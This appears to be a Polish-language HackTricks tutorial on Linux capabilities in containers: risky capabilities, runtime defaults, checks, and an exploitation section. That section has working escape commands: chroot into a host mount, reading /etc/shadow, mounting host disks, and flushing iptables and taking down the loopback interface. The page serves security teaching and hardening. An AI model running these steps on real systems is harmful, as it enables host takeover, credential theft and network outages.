# Uprawnienia Linuksa w kontenerach

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

Linux capabilities są jednym z najważniejszych elementów bezpieczeństwa kontenerów, ponieważ odpowiadają na subtelne, lecz fundamentalne pytanie: **co tak naprawdę oznacza "root" wewnątrz kontenera?** Na zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. W nowoczesnych jądrach ten przywilej jest rozłożony na mniejsze jednostki zwane capabilities. Proces może działać jako root i nadal nie mieć wielu potężnych operacji, jeśli odpowiednie capabilities zostały usunięte.

Kontenery w dużej mierze opierają się na tym rozróżnieniu. Wiele zadań uruchamianych jest nadal jako UID 0 wewnątrz kontenera ze względów kompatybilności lub prostoty. Bez usuwania capabilities byłoby to zbyt niebezpieczne. Dzięki ich usuwaniu proces root w kontenerze może wykonywać wiele zwykłych zadań wewnątrz kontenera, jednocześnie mając zabroniony dostęp do bardziej wrażliwych operacji jądra. Dlatego powłoka kontenera pokazująca `uid=0(root)` nie oznacza automatycznie "roota hosta" ani nawet "szerokich uprawnień jądra". Zestawy capabilities decydują, ile ta tożsamość root rzeczywiście jest warta.

Dla pełnego odniesienia dotyczącego Linux capabilities i wielu przykładów nadużyć zobacz:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Działanie

Capabilities są śledzone w kilku zestawach, w tym permitted, effective, inheritable, ambient i bounding. Dla wielu ocen bezpieczeństwa kontenerów dokładne semantyki jądra dla każdego zestawu są mniej pilne niż praktyczne pytanie końcowe: **jakie uprzywilejowane operacje ten proces może teraz pomyślnie wykonać i jakie przyszłe uzyskania uprawnień są nadal możliwe?**

Powód, dla którego to ma znaczenie, jest taki, że wiele technik ucieczki z kontenera to tak naprawdę problemy z capabilities przebrane za problemy kontenerowe. Obciążenie z `CAP_SYS_ADMIN` uzyskuje dostęp do ogromnej funkcjonalności jądra, której normalny proces root w kontenerze nie powinien dotykać. Obciążenie z `CAP_NET_ADMIN` staje się znacznie bardziej niebezpieczne, jeśli dodatkowo współdzieli namespace sieciowy hosta. Obciążenie z `CAP_SYS_PTRACE` staje się dużo bardziej interesujące, jeśli może zobaczyć procesy hosta przez współdzielenie PID hosta. W Dockerze lub Podman może to wyglądać jak `--pid=host`; w Kubernetes zwykle pojawia się jako `hostPID: true`.

Innymi słowy, zestaw capabilities nie może być oceniany w izolacji. Trzeba go czytać razem z namespaces, seccomp i polityką MAC.

## Laboratorium

Bardzo bezpośredni sposób na sprawdzenie capabilities wewnątrz kontenera to:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Możesz także porównać bardziej restrykcyjny kontener z takim, któremu dodano wszystkie capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Aby zobaczyć efekt wąskiego dodatku, spróbuj usunąć wszystko i dodać z powrotem tylko jedną capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Te małe eksperymenty pomagają pokazać, że runtime nie polega jedynie na przełączaniu wartości boolean o nazwie "privileged". Kształtuje on rzeczywistą powierzchnię uprawnień dostępną dla procesu.

## Uprawnienia o wysokim ryzyku

Chociaż wiele capabilities może mieć znaczenie w zależności od celu, kilka z nich pojawia się wielokrotnie w analizie ucieczek z kontenera.

**`CAP_SYS_ADMIN`** to ten, któremu obrońcy powinni przyglądać się z największą podejrzliwością. Często opisywany jest jako „nowy root”, ponieważ odblokowuje ogromną ilość funkcjonalności, w tym operacje związane z mountami, zachowania zależne od przestrzeni nazw oraz wiele ścieżek w jądrze, które nigdy nie powinny być swobodnie udostępniane kontenerom. Jeśli kontener ma `CAP_SYS_ADMIN`, słaby seccomp i brak silnego ograniczenia MAC, wiele klasycznych ścieżek ucieczki staje się znacznie bardziej realistycznych.

**`CAP_SYS_PTRACE`** ma znaczenie, gdy istnieje widoczność procesów, szczególnie jeśli namespace PID jest współdzielony z hostem lub z interesującymi sąsiednimi obciążeniami. Może to zamienić widoczność w możliwość manipulacji.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** są istotne w środowiskach skoncentrowanych na sieci. W izolowanej sieci typu bridge mogą już stanowić ryzyko; na współdzielonej przestrzeni nazw sieci hosta są znacznie groźniejsze, ponieważ obciążenie może być w stanie rekonfigurować sieć hosta, podsłuchiwać, podszywać się lub zakłócać lokalne przepływy ruchu.

**`CAP_SYS_MODULE`** zwykle jest katastrofalne w środowisku z rootem, ponieważ ładowanie modułów jądra to w praktyce kontrola nad jądrem hosta. Powinno niemal nigdy nie pojawiać się w ogólnym obciążeniu kontenera.

## Użycie runtime

Docker, Podman, stosy oparte na containerd i CRI-O wszystkie używają kontroli capabilities, ale domyślne ustawienia i interfejsy zarządzania różnią się. Docker udostępnia je bardzo bezpośrednio przez flagi takie jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne kontrolki i często zyskuje na uruchomieniu rootless jako dodatkowej warstwie bezpieczeństwa. Kubernetes ujawnia dodawanie i usuwanie capabilities przez `securityContext` Poda lub kontenera. Środowiska system-container, takie jak LXC/Incus, także opierają się na kontroli capabilities, ale szersza integracja z hostem w tych systemach często kusi operatorów do bardziej agresywnego rozluźniania domyślnych ustawień niż w środowisku app-container.

Ta sama zasada obowiązuje we wszystkich: capability, które technicznie można przyznać, niekoniecznie powinno być przyznane. Wiele rzeczywistych incydentów zaczyna się, gdy operator dodaje capability tylko dlatego, że obciążenie nie działało przy ostrzejszej konfiguracji i zespół potrzebował szybkiego rozwiązania.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest **`--cap-add=ALL`** w CLI w stylu Docker/Podman, ale to nie jedyna pomyłka. W praktyce częściej problemem jest przyznanie jednej lub dwóch ekstremalnie potężnych capabilities, zwłaszcza `CAP_SYS_ADMIN`, aby „sprawić, by aplikacja działała”, bez zrozumienia implikacji związanych z namespace, seccomp i mountami. Innym częstym trybem błędu jest łączenie dodatkowych capabilities ze współdzieleniem namespace hosta. W Dockerze lub Podmanie może to pojawić się jako `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetes równoważna ekspozycja zwykle pojawia się przez ustawienia obciążenia takie jak `hostPID: true` lub `hostNetwork: true`. Każde z tych połączeń zmienia to, na co capability faktycznie wpływa.

Często też administratorzy sądzą, że ponieważ obciążenie nie jest w pełni `--privileged`, to nadal jest znacząco ograniczone. Czasami to prawda, ale czasami faktyczna postawa jest już na tyle zbliżona do privileged, że rozróżnienie przestaje mieć znaczenie operacyjne.

## Wykorzystanie

Pierwszym praktycznym krokiem jest wyenumerowanie efektywnego zestawu capabilities i natychmiastowe przetestowanie akcji specyficznych dla poszczególnych capabilities, które miałyby znaczenie dla ucieczki lub dostępu do informacji o hoście:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Jeśli `CAP_SYS_ADMIN` jest obecny, przetestuj najpierw mount-based abuse i host filesystem access, ponieważ to jeden z najczęstszych breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Jeśli `CAP_SYS_PTRACE` jest obecne i kontener może zobaczyć interesujące procesy, sprawdź, czy to uprawnienie można wykorzystać do inspekcji procesów:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Jeśli `CAP_NET_ADMIN` lub `CAP_NET_RAW` jest obecny, sprawdź, czy workload może manipulować widocznym stosem sieciowym lub przynajmniej pozyskać przydatne informacje o sieci:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Gdy test capability powiedzie się, zestaw go z sytuacją namespace. Capability, które w izolowanym namespace wygląda jedynie na ryzykowne, może natychmiast stać się prymitywem escape lub host-recon, gdy kontener jednocześnie współdzieli host PID, host network lub host mounts.

### Pełny przykład: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Jeśli kontener ma `CAP_SYS_ADMIN` i zapisywalny bind mount systemu plików hosta taki jak `/host`, ścieżka ucieczki jest często prosta:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Jeśli `chroot` powiedzie się, polecenia będą teraz wykonywane w kontekście systemu plików root hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Jeśli `chroot` jest niedostępny, ten sam efekt często można uzyskać, uruchamiając binarkę przez zamontowane drzewo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Pełny przykład: `CAP_SYS_ADMIN` + dostęp do urządzenia

Jeśli urządzenie blokowe z hosta zostanie udostępnione, `CAP_SYS_ADMIN` może zamienić je w bezpośredni dostęp do systemu plików hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Pełny przykład: `CAP_NET_ADMIN` + Sieć hosta

To połączenie nie zawsze daje bezpośredni root na hoście, ale może w pełni przekonfigurować stos sieciowy hosta:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To może umożliwić denial of service, przechwytywanie ruchu lub dostęp do usług, które wcześniej były filtrowane.

## Sprawdzenia

Celem sprawdzeń capability nie jest jedynie zrzucenie surowych wartości, lecz zrozumienie, czy proces ma wystarczające uprawnienia, aby jego aktualna przestrzeń nazw i stan punktów montowania stały się niebezpieczne.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Co jest tutaj interesujące:

- `capsh --print` to najprostszy sposób na wykrycie capabilities o wysokim ryzyku, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` lub `cap_sys_module`.
- Linia `CapEff` w `/proc/self/status` mówi, co jest aktualnie skuteczne, nie tylko co może być dostępne w innych zbiorach.
- Zrzut informacji o capabilities staje się znacznie ważniejszy, jeśli kontener dzieli także host PID, network, lub user namespaces, albo ma zapisywalne host mounts.

Po zebraniu surowych informacji o capabilities, następnym krokiem jest ich interpretacja. Zadaj pytania: czy proces jest root, czy user namespaces są aktywne, czy host namespaces są współdzielone, czy seccomp wymusza ograniczenia, i czy AppArmor lub SELinux nadal ograniczają proces. Sam zestaw capabilities to tylko część historii, ale często to ona wyjaśnia, dlaczego jeden container breakout działa, a inny kończy się niepowodzeniem przy tym samym pozornym punkcie startowym.

## Domyślne ustawienia runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie zredukowany zestaw capabilities | Docker utrzymuje domyślną listę dozwolonych capabilities i usuwa pozostałe | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Domyślnie zredukowany zestaw capabilities | Kontenery Podman są domyślnie nieuprzywilejowane i używają zredukowanego modelu capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime, chyba że zmieniono | Jeśli nie określono `securityContext.capabilities`, kontener otrzymuje domyślny zestaw capabilities z runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Zazwyczaj domyślne dla runtime | Skuteczny zestaw zależy od runtime i specyfikacji Pod | tak samo jak w wierszu Kubernetes; bezpośrednia konfiguracja OCI/CRI może też jawnie dodać capabilities |

Dla Kubernetes ważne jest, że API nie definiuje jednego uniwersalnego domyślnego zestawu capabilities. Jeśli Pod nie dodaje ani nie usuwa capabilities, workload dziedziczy domyślny zestaw runtime dla tego węzła.
{{#include ../../../../banners/hacktricks-training.md}}
